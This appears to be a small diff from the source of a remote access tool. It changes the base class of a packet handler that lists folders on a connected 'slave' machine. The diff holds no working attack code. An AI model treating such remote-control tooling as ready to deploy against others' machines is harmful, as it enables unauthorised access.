@@ -8,7 +8,7 @@ import com.redpois0n.ui.frames.FrameRemoteFiles;
 import com.redpois0n.utils.IconUtils;
 
 
-public class PacketFOLDERLIST extends Packet {
+public class PacketFOLDERLIST extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
